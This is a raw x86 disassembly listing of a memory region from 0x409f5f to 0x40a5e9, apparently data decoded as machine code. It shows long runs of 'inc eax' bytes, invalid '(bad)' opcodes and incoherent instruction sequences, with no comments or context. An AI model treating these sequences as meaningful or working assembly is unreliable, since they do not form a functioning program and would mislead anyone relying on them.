  409f5f:	stos   DWORD PTR es:[edi],eax
  409f60:	and    esi,DWORD PTR [eax+0x49]
  409f63:	inc    eax
  409f64:	inc    eax
  409f65:	inc    eax
  409f66:	inc    eax
  409f67:	inc    eax
  409f68:	inc    eax
  409f69:	inc    eax
  409f6a:	inc    eax
  409f6b:	inc    eax
  409f6c:	inc    eax
  409f6d:	popf   
  409f6e:	fs inc esi
  409f70:	arpl   WORD PTR [ecx+0x29],ax
  409f73:	and    eax,0x71c94481
  409f78:	pop    esp
  409f79:	inc    esi
  409f7a:	sub    al,0x16
  409f7c:	pop    esi
  409f7d:	sub    al,0xb8
  409f7f:	int    0x58
  409f81:	fdiv   DWORD PTR [eax]
  409f83:	xchg   ebx,eax
  409f84:	push   cs
  409f85:	xchg   edx,eax
  409f86:	gs popa 
  409f88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f89:	add    eax,0x40404030
  409f8e:	inc    eax
  409f8f:	inc    eax
  409f90:	inc    eax
  409f91:	inc    eax
  409f92:	inc    eax
  409f93:	add    dl,dh
  409f95:	lds    ebp,FWORD PTR ss:[eax+0x21cb698c]
  409f9c:	xchg   ecx,eax
  409f9d:	or     BYTE PTR [esi+edx*1+0x12],bl
  409fa1:	pop    eax
  409fa2:	cmp    eax,0xee010260
  409fa7:	inc    eax
  409fa8:	inc    eax
  409fa9:	inc    eax
  409faa:	inc    eax
  409fab:	inc    eax
  409fac:	inc    eax
  409fad:	and    eax,0xb0404040
  409fb2:	jno    0x409ff1
  409fb4:	sar    BYTE PTR [edx-0x6f],cl
  409fb7:	inc    ebp
  409fb8:	inc    esp
  409fb9:	inc    ebx
  409fba:	(bad)  
  409fbb:	ret    
  409fbc:	inc    eax
  409fbd:	and    eax,0x40404051
  409fc2:	inc    eax
  409fc3:	inc    eax
  409fc4:	inc    eax
  409fc5:	inc    eax
  409fc6:	inc    eax
  409fc7:	inc    eax
  409fc8:	inc    eax
  409fc9:	mov    ch,BYTE PTR [edx+eax*2]
  409fcc:	pop    esp
  409fcd:	das    
  409fce:	mov    WORD PTR [eax],?
  409fd0:	jne    0x40a004
  409fd2:	nop
  409fd3:	inc    ecx
  409fd4:	mov    esp,0x413969a3
  409fd9:	not    ch
  409fdb:	hlt    
  409fdc:	std    
  409fdd:	gs dec esp
  409fdf:	adc    al,0x40
  409fe1:	inc    eax
  409fe2:	inc    eax
  409fe3:	inc    eax
  409fe4:	inc    eax
  409fe5:	inc    eax
  409fe6:	rol    DWORD PTR [eax+0x40],0x59
  409fea:	sbb    cl,cl
  409fec:	pusha  
  409fed:	ins    DWORD PTR es:[edi],dx
  409fee:	adc    al,0xba
  409ff0:	ins    DWORD PTR es:[edi],dx
  409ff1:	inc    ecx
  409ff2:	add    edx,esi
  409ff4:	fild   WORD PTR [ebp+0x5d]
  409ff7:	int    0x34
  409ff9:	mov    cl,0x27
  409ffb:	lods   eax,DWORD PTR fs:[esi]
  409ffd:	mov    esp,0xff2e9add
  40a002:	add    DWORD PTR [eax+0x40],eax
  40a005:	add    BYTE PTR [eax+0x40],al
  40a008:	inc    eax
  40a009:	inc    eax
  40a00a:	inc    eax
  40a00b:	inc    eax
  40a00c:	inc    esp
  40a00d:	bound  ebp,QWORD PTR [ebx+0x45]
  40a010:	test   al,0x25
  40a012:	inc    edx
  40a013:	dec    ebx
  40a014:	sub    al,0xcd
  40a016:	pop    edi
  40a017:	inc    eax
  40a018:	bound  esi,QWORD PTR [eax+esi*4]
  40a01b:	or     BYTE PTR [esi+0x726adcb0],0x2e
  40a022:	pusha  
  40a023:	jl     0x409ff2
  40a025:	retf   
  40a026:	inc    eax
  40a027:	pop    esp
  40a028:	bound  ebp,QWORD PTR [edi]
  40a02a:	jbe    0x40a04b
  40a02c:	dec    esi
  40a02d:	inc    eax
  40a02e:	inc    eax
  40a02f:	inc    eax
  40a030:	inc    eax
  40a031:	inc    eax
  40a032:	inc    eax
  40a033:	inc    eax
  40a034:	inc    eax
  40a035:	inc    eax
  40a036:	inc    eax
  40a037:	inc    esp
  40a038:	xor    BYTE PTR [edx+eax*2-0x1fee8fd],cl
  40a03f:	jmp    0x40a002
  40a041:	sub    al,BYTE PTR es:[eax+0x78]
  40a045:	push   edi
  40a046:	inc    esp
  40a047:	outs   dx,BYTE PTR ds:[esi]
  40a048:	int3   
  40a049:	int3   
  40a04a:	inc    ecx
  40a04b:	inc    eax
  40a04c:	mov    ch,0x84
  40a04e:	sub    al,0xd4
  40a050:	pop    esi
  40a051:	pop    ds
  40a052:	sub    al,BYTE PTR [eax+0x43]
  40a055:	bound  ecx,QWORD PTR [ebp+ecx*8+0x406928b8]
  40a05c:	ror    BYTE PTR [ecx+0x40],cl
  40a05f:	inc    eax
  40a060:	inc    eax
  40a061:	inc    eax
  40a062:	inc    eax
  40a063:	inc    eax
  40a064:	int3   
  40a065:	jne    0x40a0a7
  40a067:	lds    esp,FWORD PTR [ecx]
  40a069:	and    ah,BYTE PTR [eax+0x34]
  40a06c:	inc    eax
  40a06d:	add    BYTE PTR ss:[edi+0x34],0xc0
  40a072:	cmp    al,0x43
  40a074:	inc    eax
  40a075:	inc    eax
  40a076:	lods   eax,DWORD PTR ds:[esi]
  40a077:	out    dx,al
  40a078:	adc    BYTE PTR [ebx+0x45],0x40
  40a07c:	add    cl,al
  40a07e:	inc    eax
  40a07f:	inc    eax
  40a080:	inc    eax
  40a081:	inc    eax
  40a082:	add    BYTE PTR [eax+0x52],al
  40a085:	and    al,0x31
  40a087:	ja     0x40a0cd
  40a089:	lds    edi,FWORD PTR [edi-0x179a7f79]
  40a08f:	inc    eax
  40a090:	sub    al,0x90
  40a092:	or     eax,0x40606541
  40a097:	inc    eax
  40a098:	inc    eax
  40a099:	inc    eax
  40a09a:	inc    eax
  40a09b:	inc    eax
  40a09c:	inc    eax
  40a09d:	inc    eax
  40a09e:	inc    DWORD PTR [eax-0x47]
  40a0a1:	add    ecx,DWORD PTR [edx+0x7efe2dbf]
  40a0a7:	jp     0x40a0a4
  40a0a9:	dec    ecx
  40a0aa:	aad    0x74
  40a0ac:	push   edx
  40a0ad:	push   ebp
  40a0ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0af:	sub    BYTE PTR [eax+eax*1+0x42],dh
  40a0b3:	inc    esp
  40a0b4:	jb     0x40a05e
  40a0b6:	(bad)  
  40a0b7:	xor    al,0x51
  40a0b9:	add    esi,edi
  40a0bb:	xor    DWORD PTR [eax+edx*1+0x40402708],edx
  40a0c2:	inc    eax
  40a0c3:	inc    eax
  40a0c4:	inc    eax
  40a0c5:	inc    eax
  40a0c6:	inc    eax
  40a0c7:	inc    eax
  40a0c8:	inc    eax
  40a0c9:	inc    eax
  40a0ca:	dec    esi
  40a0cb:	pop    esp
  40a0cc:	inc    esp
  40a0cd:	cmp    BYTE PTR [ebx+0x45],ah
  40a0d0:	push   esp
  40a0d1:	cs nop
  40a0d3:	sub    BYTE PTR [ebx+ecx*2],0x27
  40a0d7:	ror    ecx,cl
  40a0d9:	and    eax,0x88752c
  40a0de:	push   esp
  40a0df:	mov    al,ds:0x40400c26
  40a0e4:	inc    eax
  40a0e5:	inc    eax
  40a0e6:	inc    eax
  40a0e7:	inc    eax
  40a0e8:	inc    eax
  40a0e9:	inc    eax
  40a0ea:	add    BYTE PTR [edi+0x40],cl
  40a0ed:	int    0x69
  40a0ef:	bound  ebp,QWORD PTR [ebx+0x545f6dbc]
  40a0f5:	inc    ebp
  40a0f6:	out    dx,al
  40a0f7:	rol    DWORD PTR [eax+0x40],1
  40a0fa:	inc    eax
  40a0fb:	inc    eax
  40a0fc:	inc    eax
  40a0fd:	inc    eax
  40a0fe:	and    eax,0x19404040
  40a103:	inc    edx
  40a104:	xor    al,0x3
  40a106:	arpl   si,di
  40a108:	arpl   WORD PTR [eax],bp
  40a10a:	out    dx,al
  40a10b:	dec    esp
  40a10c:	cs mov cl,0x12
  40a10f:	inc    esp
  40a110:	rol    BYTE PTR [ebp+eiz*2+0x30],0x25
  40a115:	inc    esi
  40a116:	xchg   ecx,eax
  40a117:	sub    al,0x50
  40a119:	enter  0x40a8,0x40
  40a11d:	inc    eax
  40a11e:	inc    eax
  40a11f:	inc    eax
  40a120:	inc    eax
  40a121:	inc    eax
  40a122:	inc    eax
  40a123:	inc    eax
  40a124:	inc    eax
  40a125:	mov    BYTE PTR [ecx+esi*8],dh
  40a128:	jo     0x40a0b0
  40a12a:	arpl   WORD PTR [edx+0x12],bp
  40a12d:	imul   ebp,DWORD PTR [esi],0x4f
  40a130:	add    al,0xc5
  40a132:	pop    ecx
  40a133:	fimul  DWORD PTR [esp+ebp*4+0x2f]
  40a137:	pop    ecx
  40a138:	gs inc ecx
  40a13a:	shr    ch,1
  40a13c:	adc    DWORD PTR ds:0xce524f03,ecx
  40a142:	(bad)  
  40a143:	mov    al,0x42
  40a145:	retf   
  40a146:	inc    eax
  40a147:	pop    edi
  40a148:	inc    eax
  40a149:	inc    eax
  40a14a:	inc    eax
  40a14b:	inc    eax
  40a14c:	inc    eax
  40a14d:	inc    eax
  40a14e:	rol    DWORD PTR [eax+0x40],0x1
  40a152:	jno    0x40a165
  40a154:	cmp    DWORD PTR [edi+0x769f4a41],ecx
  40a15a:	inc    esp
  40a15b:	aaa    
  40a15c:	xor    DWORD PTR [eax+0xc4f4d80],edi
  40a162:	sub    eax,0x404062a6
  40a167:	add    BYTE PTR [eax+0x40],al
  40a16a:	inc    eax
  40a16b:	inc    eax
  40a16c:	inc    eax
  40a16d:	inc    eax
  40a16e:	(bad)
  40a173:	test   BYTE PTR [ebx+0x4e],ah
  40a176:	push   ecx
  40a177:	mov    al,0x33
  40a179:	jbe    0x40a1bb
  40a17b:	inc    esp
  40a17c:	inc    eax
  40a17d:	cmp    BYTE PTR ds:0x2c772f05,bl
  40a183:	in     eax,dx
  40a184:	inc    eax
  40a185:	sbb    al,0x40
  40a187:	inc    eax
  40a188:	inc    eax
  40a189:	inc    eax
  40a18a:	inc    eax
  40a18b:	inc    eax
  40a18c:	inc    eax
  40a18d:	inc    eax
  40a18e:	inc    eax
  40a18f:	inc    eax
  40a190:	aad    0xcb
  40a192:	sub    al,0x50
  40a194:	jge    0x40a20a
  40a196:	inc    eax
  40a197:	mov    esp,0x7f23be66
  40a19c:	inc    esi
  40a19d:	inc    esp
  40a19e:	ret    0x5092
  40a1a1:	add    ah,BYTE PTR [eax+0x58]
  40a1a4:	mov    BYTE PTR ds:0x4a83d32b,ch
  40a1aa:	jp     0x40a19f
  40a1ac:	pusha  
  40a1ad:	or     al,0xc1
  40a1b0:	cdq    
  40a1b1:	clc    
  40a1b2:	cs pop ecx
  40a1b4:	inc    esp
  40a1b5:	int    0x40
  40a1b7:	inc    eax
  40a1b8:	inc    eax
  40a1b9:	inc    eax
  40a1ba:	inc    eax
  40a1bb:	inc    eax
  40a1bc:	int3   
  40a1bd:	jne    0x40a1ff
  40a1bf:	test   dh,ch
  40a1c1:	push   edx
  40a1c2:	sub    BYTE PTR [edi],ch
  40a1c4:	jno    0x40a146
  40a1c6:	inc    edi
  40a1c7:	inc    eax
  40a1c8:	and    al,0x64
  40a1ca:	adc    eax,0xee244029
  40a1cf:	stos   DWORD PTR es:[edi],eax
  40a1d0:	adc    bh,BYTE PTR [ebx+ecx*8]
  40a1d3:	inc    eax
  40a1d4:	add    cl,al
  40a1d6:	inc    eax
  40a1d7:	inc    eax
  40a1d8:	inc    eax
  40a1d9:	inc    eax
  40a1da:	add    BYTE PTR [eax+0x34],al
  40a1dd:	push   eax
  40a1de:	fs inc esp
  40a1e0:	add    eax,0x2389410d
  40a1e5:	jns    0x40a1e9
  40a1e7:	sub    al,0x86
  40a1e9:	enter  0x40b0,0x40
  40a1ed:	inc    eax
  40a1ee:	inc    eax
  40a1ef:	inc    eax
  40a1f0:	inc    eax
  40a1f1:	inc    eax
  40a1f2:	inc    eax
  40a1f3:	inc    DWORD PTR [eax+0x73]
  40a1f6:	and    eax,0x6f807c58
  40a1fb:	xor    ch,BYTE PTR [eax+0x41]
  40a1fe:	cs jno 0x40a214
  40a201:	push   ecx
  40a202:	stos   BYTE PTR es:[edi],al
  40a203:	arpl   ax,dx
  40a205:	dec    edx
  40a206:	inc    eax
  40a207:	inc    eax
  40a208:	inc    eax
  40a209:	inc    eax
  40a20a:	inc    eax
  40a20b:	inc    eax
  40a20c:	inc    eax
  40a20d:	inc    eax
  40a20e:	inc    eax
  40a20f:	inc    eax
  40a210:	cs mov ebp,0x3a059d8d
  40a216:	pusha  
  40a217:	call   0x4455fa4b
  40a21c:	xchg   BYTE PTR [eax],dh
  40a21e:	arpl   WORD PTR [eax],cx
  40a220:	add    edi,ebx
  40a222:	sbb    BYTE PTR [edi+ebp*2],ch
  40a225:	or     DWORD PTR [eax+ebp*4],edi
  40a228:	inc    eax
  40a229:	sub    al,0x1
  40a22b:	(bad)  
  40a22c:	test   eax,0x40fc28ab
  40a231:	xchg   ecx,eax
  40a232:	inc    eax
  40a233:	inc    eax
  40a234:	inc    eax
  40a235:	inc    eax
  40a236:	inc    eax
  40a237:	inc    eax
  40a238:	inc    eax
  40a239:	inc    eax
  40a23a:	add    BYTE PTR [ebx+0x44],dl
  40a23d:	add    eax,0x403e31f1
  40a242:	pop    esp
  40a243:	xchg   ebp,ebp
  40a245:	xchg   BYTE PTR [edx+0x30402a62],bl
  40a24b:	inc    eax
  40a24c:	jb     0x40a2c8
  40a24e:	(bad)  
  40a24f:	fnstenv ds:0x44042c4a
  40a255:	test   al,0x46
  40a257:	xor    eax,0x40404040
  40a25c:	inc    eax
  40a25d:	inc    eax
  40a25e:	and    eax,0x42404040
  40a263:	dec    ebp
  40a264:	sub    al,0x70
  40a266:	sub    eax,0x48a83505
  40a26b:	and    eax,0x86fc4052
  40a270:	inc    eax
  40a271:	jae    0x40a2b0
  40a273:	ss jp  0x40a276
  40a276:	int    0x30
  40a278:	dec    eax
  40a279:	xlat   BYTE PTR ds:[ebx]
  40a27a:	ret    
  40a27b:	sub    DWORD PTR [esi],eax
  40a27d:	js     0x40a2c6
  40a27f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a280:	inc    ecx
  40a281:	loop   0x40a2c3
  40a283:	sub    al,0x40
  40a285:	inc    eax
  40a286:	inc    eax
  40a287:	inc    eax
  40a288:	inc    eax
  40a289:	inc    eax
  40a28a:	inc    eax
  40a28b:	inc    eax
  40a28c:	inc    eax
  40a28d:	inc    eax
  40a28e:	push   ecx
  40a28f:	push   edx
  40a290:	out    dx,al
  40a291:	add    eax,0x144aba2
  40a296:	je     0x40a221
  40a298:	inc    esp
  40a299:	xchg   ah,bh
  40a29b:	inc    ebp
  40a29c:	and    al,0x6d
  40a29e:	xchg   ecx,eax
  40a29f:	push   esi
  40a2a0:	sub    al,0x34
  40a2a2:	fs out dx,al
  40a2a4:	jo     0x40a2d6
  40a2a6:	stos   DWORD PTR es:[edi],eax
  40a2a7:	or     dl,bh
  40a2a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2aa:	push   eax
  40a2ab:	push   esp
  40a2ac:	bound  esp,QWORD PTR ds:0x548ab41
  40a2b2:	and    al,0xa8
  40a2b4:	inc    eax
  40a2b5:	inc    eax
  40a2b6:	inc    eax
  40a2b7:	inc    eax
  40a2b8:	inc    eax
  40a2b9:	inc    eax
  40a2ba:	rol    DWORD PTR [eax+0x40],0x65
  40a2be:	and    eax,0x869d7150
  40a2c3:	jge    0x40a2d6
  40a2c5:	add    BYTE PTR [ebx],cl
  40a2c7:	aaa    
  40a2c8:	inc    sp
  40a2ca:	inc    eax
  40a2cb:	inc    eax
  40a2cc:	add    BYTE PTR [eax+0x40],al
  40a2cf:	inc    eax
  40a2d0:	inc    eax
  40a2d1:	inc    eax
  40a2d2:	inc    eax
  40a2d3:	xor    al,0x65
  40a2d5:	inc    esp
  40a2d6:	arpl   WORD PTR [eax+0x2c],sp
  40a2d9:	add    ch,BYTE PTR [eiz*4+0x7ab5088c]
  40a2e0:	fnstsw WORD PTR [edx]
  40a2e2:	clc    
  40a2e3:	add    eax,0x2ec4cb4f
  40a2e8:	push   esi
  40a2e9:	inc    eax
  40a2ea:	inc    esp
  40a2eb:	xchg   BYTE PTR [ecx-0x44],dh
  40a2ee:	dec    edi
  40a2ef:	das    
  40a2f0:	inc    eax
  40a2f1:	inc    eax
  40a2f2:	inc    eax
  40a2f3:	inc    eax
  40a2f4:	inc    eax
  40a2f5:	inc    eax
  40a2f6:	inc    eax
  40a2f7:	inc    eax
  40a2f8:	inc    eax
  40a2f9:	inc    eax
  40a2fa:	aas    
  40a2fb:	sub    ebp,ebp
  40a2fd:	sub    BYTE PTR [esi+0x5],ch
  40a300:	popa   
  40a301:	sub    DWORD PTR [edi+0x66],ecx
  40a304:	ins    DWORD PTR es:[edi],dx
  40a305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a306:	addr16 retf 
  40a308:	dec    ebx
  40a309:	xor    al,0x94
  40a30b:	add    DWORD PTR [esp+ecx*2-0x24],0x69236546
  40a313:	inc    ebx
  40a314:	sub    eax,0x4014ff40
  40a319:	inc    eax
  40a31a:	inc    eax
  40a31b:	inc    eax
  40a31c:	inc    eax
  40a31d:	inc    eax
  40a31e:	int3   
  40a31f:	jne    0x40a361
  40a321:	mov    eax,0xf6806e25
  40a326:	fs es clc 
  40a329:	sbb    DWORD PTR [esi],ebp
  40a32b:	xor    ebp,DWORD PTR [esi]
  40a32d:	int    0xf8
  40a32f:	in     al,0x62
  40a331:	popa   
  40a332:	cs push esp
  40a334:	push   es
  40a335:	ret    0xc262
  40a338:	inc    ebp
  40a339:	dec    edx
  40a33a:	das    
  40a33b:	mov    bl,0x40
  40a33d:	add    cl,al
  40a33f:	inc    eax
  40a340:	inc    eax
  40a341:	inc    eax
  40a342:	inc    eax
  40a343:	add    BYTE PTR [eax+0x49],al
  40a346:	test   BYTE PTR [ecx-0x3d],0xc4
  40a34a:	arpl   WORD PTR [ebx],ax
  40a34c:	sti    
  40a34d:	and    BYTE PTR [edx+edi*2+0x68],0x40
  40a352:	mov    ds:0x44267540,eax
  40a357:	test   eax,0x40c02a66
  40a35c:	mov    bl,0x71
  40a35e:	inc    eax
  40a35f:	inc    eax
  40a360:	inc    eax
  40a361:	inc    eax
  40a362:	inc    eax
  40a363:	inc    eax
  40a364:	inc    eax
  40a365:	inc    eax
  40a366:	inc    DWORD PTR [eax+0x2c]
  40a369:	mov    al,0x54
  40a36b:	dec    edx
  40a36c:	lods   al,BYTE PTR ds:[esi]
  40a36d:	inc    eax
  40a36e:	pop    esp
  40a36f:	add    esi,esp
  40a371:	inc    ecx
  40a372:	cmp    al,0xc8
  40a374:	adc    eax,0xc03d74a
  40a379:	add    al,bl
  40a37b:	dec    eax
  40a37c:	int    0x4d
  40a37e:	jbe    0x40a381
  40a380:	(bad)  
  40a381:	les    edi,FWORD PTR [eax]
  40a383:	or     BYTE PTR [ebx+0x4470b224],al
  40a389:	inc    eax
  40a38a:	inc    eax
  40a38b:	inc    eax
  40a38c:	inc    eax
  40a38d:	inc    eax
  40a38e:	inc    eax
  40a38f:	inc    eax
  40a390:	inc    eax
  40a391:	inc    eax
  40a392:	inc    eax
  40a393:	push   eax
  40a394:	retfw  0x2523
  40a398:	push   0xbd572c87
  40a39d:	inc    esp
  40a39e:	gs and al,0x4d
  40a3a1:	inc    eax
  40a3a2:	inc    eax
  40a3a3:	inc    eax
  40a3a4:	inc    eax
  40a3a5:	inc    eax
  40a3a6:	inc    eax
  40a3a7:	inc    eax
  40a3a8:	inc    eax
  40a3a9:	add    BYTE PTR [edx-0xe],ah
  40a3ac:	shr    DWORD PTR [eax-0x2ad02088],0x84
  40a3b3:	aad    0x68
  40a3b5:	adc    ah,BYTE PTR [eax]
  40a3b7:	cwde   
  40a3b8:	and    ecx,DWORD PTR [ebp+0x2d]
  40a3bb:	inc    edx
  40a3bc:	add    al,0x41
  40a3be:	adc    esi,esi
  40a3c0:	fistp  WORD PTR cs:[eax-0x22]
  40a3c4:	and    BYTE PTR [ebx-0x35],ch
  40a3c7:	loopne 0x40a3ee
  40a3c9:	dec    ebp
  40a3ca:	add    DWORD PTR [ebp-0x32],esi
  40a3cd:	inc    eax
  40a3ce:	inc    eax
  40a3cf:	inc    eax
  40a3d0:	inc    eax
  40a3d1:	inc    eax
  40a3d2:	inc    eax
  40a3d3:	and    eax,0x38404040
  40a3d8:	int3   
  40a3d9:	or     eax,0x48fddf2c
  40a3de:	test   BYTE PTR [ecx+0x4032cb3a],ch
  40a3e4:	jno    0x40a423
  40a3e6:	push   ss
  40a3e7:	xchg   ecx,eax
  40a3e8:	bound  esi,QWORD PTR [eax-0xff6aacb]
  40a3ee:	pop    esp
  40a3ef:	mov    ah,0xd8
  40a3f1:	imul   BYTE PTR [ebp-0x51]
  40a3f4:	pop    esi
  40a3f5:	int    0x3
  40a3f7:	or     eax,0x562d23a8
  40a3fc:	retf   
  40a3fd:	leave  
  40a3fe:	inc    eax
  40a3ff:	inc    eax
  40a400:	inc    eax
  40a401:	inc    eax
  40a402:	inc    eax
  40a403:	inc    eax
  40a404:	inc    eax
  40a405:	inc    eax
  40a406:	inc    eax
  40a407:	inc    eax
  40a408:	fmulp  st(3),st
  40a40a:	bound  esi,QWORD PTR [eax+0x264cdf32]
  40a410:	imul   eax,DWORD PTR [edx+0x6f],0xc64e2f05
  40a417:	inc    ecx
  40a418:	pop    esp
  40a419:	pop    esi
  40a41a:	inc    eax
  40a41b:	inc    eax
  40a41c:	inc    eax
  40a41d:	inc    eax
  40a41e:	inc    eax
  40a41f:	inc    eax
  40a420:	rol    DWORD PTR [eax+0x40],0x34
  40a424:	leave  
  40a425:	es mov ch,0x73
  40a428:	hlt    
  40a429:	imul   ebx,DWORD PTR [esp+eax*2],0x40406d44
  40a430:	adc    BYTE PTR [eax+0x40],al
  40a433:	add    BYTE PTR [eax+0x40],al
  40a436:	inc    eax
  40a437:	inc    eax
  40a438:	inc    eax
  40a439:	inc    eax
  40a43a:	inc    ecx
  40a43b:	pop    ebp
  40a43c:	add    BYTE PTR [ecx+0x37],al
  40a43f:	xor    DWORD PTR [edx+0x52],edi
  40a442:	mov    ebx,cs
  40a444:	mov    WORD PTR [ebp+0x37],ss
  40a447:	sub    DWORD PTR [ecx+0x44],edi
  40a44a:	pop    ds
  40a44b:	jno    0x40a48b
  40a44d:	fdiv   QWORD PTR [edi]
  40a44f:	inc    eax
  40a451:	sub    al,0x77
  40a453:	push   edi
  40a454:	sti    
  40a455:	fld    TBYTE PTR [ebp+0x43]
  40a458:	cs out dx,al
  40a45a:	sub    DWORD PTR [esi+0x40],esi
  40a45d:	inc    eax
  40a45e:	inc    eax
  40a45f:	inc    eax
  40a460:	inc    eax
  40a461:	inc    eax
  40a462:	inc    eax
  40a463:	inc    eax
  40a464:	inc    eax
  40a465:	inc    eax
  40a466:	and    al,0xa8
  40a468:	cmp    BYTE PTR [edi+0x5a4144a2],bh
  40a46e:	add    BYTE PTR [ecx],dl
  40a470:	outs   dx,DWORD PTR ds:[esi]
  40a471:	sub    bl,ah
  40a473:	in     eax,dx
  40a474:	mov    WORD PTR [eax+0x2a],?
  40a477:	mov    eax,0x79c25f2e
  40a47c:	sub    eax,DWORD PTR [eax+eax*2+0x247e2f0d]
  40a483:	inc    esp
  40a484:	test   al,0x63
  40a486:	inc    eax
  40a487:	inc    edx
  40a488:	sub    edi,edi
  40a48a:	ja     0x40a4cc
  40a48c:	inc    eax
  40a48d:	inc    eax
  40a48e:	inc    eax
  40a48f:	inc    eax
  40a490:	inc    eax
  40a491:	int3   
  40a492:	jne    0x40a4d4
  40a494:	sub    eax,0x82507bf3
  40a499:	xor    al,0xc1
  40a49b:	shr    ah,0x42
  40a49e:	enter  0x2864,0x21
  40a4a2:	jg     0x40a4d4
  40a4a4:	aad    0x62
  40a4a6:	mov    DWORD PTR [eax],ebp
  40a4a8:	bound  esp,QWORD PTR [ebx]
  40a4aa:	mov    edi,0x4c442c51
  40a4af:	inc    eax
  40a4b0:	add    cl,al
  40a4b2:	inc    eax
  40a4b3:	inc    eax
  40a4b4:	inc    eax
  40a4b5:	inc    eax
  40a4b6:	add    BYTE PTR [eax+0x44],al
  40a4b9:	pop    es
  40a4ba:	sub    DWORD PTR [ecx-0x3e],esp
  40a4bd:	cs xor eax,0x2cffd534
  40a4c3:	mov    edi,0xd98d5438
  40a4c8:	fsub   QWORD PTR ds:0x40280330
  40a4ce:	inc    eax
  40a4cf:	inc    eax
  40a4d0:	inc    eax
  40a4d1:	inc    eax
  40a4d2:	inc    eax
  40a4d3:	inc    eax
  40a4d4:	inc    eax
  40a4d5:	inc    DWORD PTR [eax-0x6]
  40a4d8:	arpl   ax,bp
  40a4da:	bound  eax,QWORD PTR [eax+esi*1-0x21]
  40a4de:	ror    BYTE PTR [ebx],0x37
  40a4e1:	cmp    BYTE PTR [ebx+0x47],ah
  40a4e4:	and    DWORD PTR [edx+0x71],edx
  40a4e7:	gs ret 
  40a4e9:	and    BYTE PTR [ecx+edi*1+0x62ea1360],cl
  40a4f0:	mov    al,gs:0x607a540f
  40a4f6:	inc    eax
  40a4f7:	bound  esp,QWORD PTR [edi-0x6c]
  40a4fa:	inc    ecx
  40a4fb:	lahf   
  40a4fc:	inc    eax
  40a4fd:	inc    eax
  40a4fe:	inc    eax
  40a4ff:	inc    eax
  40a500:	inc    eax
  40a501:	inc    eax
  40a502:	inc    eax
  40a503:	inc    eax
  40a504:	inc    eax
  40a505:	inc    eax
  40a506:	and    eax,0x26847a33
  40a50b:	dec    edi
  40a50c:	jns    0x40a4b3
  40a50e:	xor    BYTE PTR [ebx+0x64],ch
  40a511:	gs ins BYTE PTR es:[edi],dx
  40a513:	pushf  
  40a514:	jns    0x40a4f0
  40a516:	cmp    ecx,edx
  40a518:	rol    BYTE PTR [eax+0x40],0x40
  40a51c:	inc    eax
  40a51d:	inc    eax
  40a51e:	inc    eax
  40a51f:	inc    eax
  40a520:	inc    eax
  40a521:	add    BYTE PTR [ebx+eiz*2+0x22],al
  40a525:	inc    eax
  40a526:	pusha  
  40a527:	adc    al,0x61
  40a529:	xor    al,0x2c
  40a52b:	jbe    0x40a4d8
  40a52d:	inc    eax
  40a52e:	sub    BYTE PTR [ebp+0x11],ch
  40a531:	dec    ebx
  40a532:	call   0x63815d7a
  40a537:	inc    eax
  40a538:	inc    eax
  40a539:	inc    eax
  40a53a:	inc    eax
  40a53b:	inc    eax
  40a53c:	inc    eax
  40a53d:	and    eax,0x34404040
  40a542:	cmpps  xmm0,xmm5,0xf5
  40a546:	mov    eax,0x142ea287
  40a54b:	aaa    
  40a54c:	inc    ecx
  40a54d:	fs iret 
  40a54f:	inc    ecx
  40a550:	sub    al,0x25
  40a552:	xor    dl,BYTE PTR [ebx-0x32]
  40a555:	and    BYTE PTR [esp+ecx*1+0x41],0x34
  40a55a:	mov    esi,0x40404040
  40a55f:	inc    eax
  40a560:	inc    eax
  40a561:	inc    eax
  40a562:	inc    eax
  40a563:	inc    eax
  40a564:	inc    eax
  40a565:	iret   
  40a566:	push   es
  40a567:	ret    
  40a568:	xor    DWORD PTR [eax+0x4d4e2e25],0x62646c44
  40a572:	pop    esp
  40a573:	das    
  40a574:	adc    al,0xc0
  40a576:	sub    eax,0x4049542b
  40a57b:	inc    eax
  40a57c:	inc    eax
  40a57d:	inc    eax
  40a57e:	inc    eax
  40a57f:	inc    eax
  40a580:	rol    DWORD PTR [eax+0x40],0xfa
  40a584:	add    eax,edi
  40a586:	imul   esp,esi,0x68
  40a589:	mov    dl,0xac
  40a58b:	jne    0x40a5cd
  40a58d:	jmp    FWORD PTR [ecx]
  40a58f:	dec    eax
  40a590:	lahf   
  40a591:	mov    esp,0x1640584c
  40a596:	jne    0x40a595
  40a598:	jno    0x40a602
  40a59a:	lods   al,BYTE PTR ds:[esi]
  40a59b:	mov    edi,0x3bc11340
  40a5a0:	inc    eax
  40a5a1:	inc    eax
  40a5a2:	add    BYTE PTR [eax+0x40],al
  40a5a5:	inc    eax
  40a5a6:	inc    eax
  40a5a7:	inc    eax
  40a5a8:	inc    eax
  40a5a9:	bound  ecx,QWORD PTR [edi+0x79]
  40a5ac:	fld    QWORD PTR [eax+0x7b]
  40a5af:	inc    ebp
  40a5b0:	inc    esp
  40a5b1:	retf   
  40a5b2:	fdivr  QWORD PTR [esi]
  40a5b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5b5:	cdq    
  40a5b6:	inc    eax
  40a5b7:	shr    BYTE PTR ds:0xbc68615d,0x40
  40a5be:	inc    eax
  40a5bf:	inc    eax
  40a5c0:	inc    eax
  40a5c1:	inc    eax
  40a5c2:	inc    eax
  40a5c3:	inc    eax
  40a5c4:	inc    eax
  40a5c5:	inc    eax
  40a5c6:	inc    eax
  40a5c7:	stos   BYTE PTR es:[edi],al
  40a5c8:	push   eax
  40a5c9:	jp     0x40a5af
  40a5cb:	in     al,dx
  40a5cc:	pushf  
  40a5cd:	cwde   
  40a5ce:	dec    ebx
  40a5cf:	jl     0x40a648
  40a5d1:	jnp    0x40a5a0
  40a5d3:	scas   al,BYTE PTR es:[edi]
  40a5d4:	data16 xor BYTE PTR [eax],0x9b
  40a5d8:	adc    ecx,eax
  40a5da:	pop    ebp
  40a5db:	inc    eax
  40a5dc:	inc    eax
  40a5dd:	inc    eax
  40a5de:	inc    eax
  40a5df:	inc    eax
  40a5e0:	inc    eax
  40a5e1:	int3   
  40a5e2:	jne    0x40a624
  40a5e4:	bound  eax,QWORD PTR [edx+0x73]
  40a5e7:	inc    ebx
  40a5e8:	xchg   edx,eax
  40a5e9:	jnp    0x40a658
